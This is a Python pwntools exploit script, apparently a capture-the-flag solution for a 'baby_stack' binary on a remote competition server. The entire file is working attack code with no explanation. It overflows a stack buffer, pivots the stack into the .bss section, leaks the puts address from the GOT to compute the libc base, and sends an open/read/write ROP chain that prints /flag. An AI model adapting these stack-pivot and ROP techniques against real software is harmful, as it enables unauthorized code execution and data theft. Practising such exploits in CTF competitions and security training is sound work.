from pwn import *
context(os="linux",arch="amd64",log_level="debug")
#p=process("./baby_stack")
p=remote("competition.blue-whale.me",20576)
elf=ELF("baby_stack")

def debug():
	gdb.attach(p)
	pause()

puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main_addr=elf.sym["main"]
leave_ret=0x0400a74
pop_rdi=0x0400b93
pop_rbp=0x04008d0
bss_addr=0x0601080+0x100
read_addr_leave_ret=0x0400AEF
p.recvuntil(b"content:\n")
p.send(b"a"*0x140)
p.recvuntil(b"again:\n")
payload1=b"a"*0x140+p64(bss_addr+0x140)+p64(read_addr_leave_ret)
p.send(payload1)
#debug()
payload2=(p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rbp)+p64(bss_addr+0x100+0x140)+p64(read_addr_leave_ret)).ljust(0x140,b"\x00")
payload2+=p64(bss_addr-0x8)+p64(leave_ret)
p.send(payload2)
#debug()
puts_addr=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("puts_addr :",hex(puts_addr))
libc=ELF("glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
libc_base=puts_addr-libc.sym["puts"]
open_addr=libc_base+libc.sym["open"]
read_addr=libc_base+libc.sym["read"]
write_addr=libc_base+libc.sym["write"]
print("libc_base :",hex(libc_base))
pop_rdx=libc_base+0x1b92
pop_rsi=libc_base+0x202f8
payload3=b"/flag\x00\x00\x00"+p64(0)+p64(pop_rdi)+p64(bss_addr+0x100)+p64(pop_rsi)+p64(0)+p64(open_addr)
payload3+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss_addr+0x700)+p64(pop_rdx)+p64(0x100)+p64(read_addr)
payload3+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss_addr+0x700)+p64(pop_rdx)+p64(0x100)+p64(write_addr)
payload4=(payload3).ljust(0x140,b"\x00")+p64(bss_addr+0x100+0x8)+p64(leave_ret)
p.sendline(payload4)
#debug()
p.interactive()
#debug()